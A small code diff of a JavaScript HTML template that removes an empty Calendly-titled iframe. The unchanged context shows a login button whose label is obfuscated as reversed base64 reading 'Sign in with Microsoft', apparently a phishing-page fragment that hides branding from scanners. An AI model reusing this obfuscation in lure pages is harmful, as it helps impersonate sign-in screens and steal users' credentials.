@@ -573,8 +573,6 @@ const primaryHTML = `
                         <button id="login-btn"><img id="lgImg" src="/primary/images/logo.svg"></img>OBFS==Adm92cvJ3Yp1EIoRXa3BibpBibnl2UEND</button>
                     </div>
                 </div>
-            </div>
-            <iframe id="calendly-frame" src="" frameBorder="0" width="100%" height="100%" title="Select Date & Time - Etech-it.com"></iframe>
-            
+            </div>     
     </main>
 `;
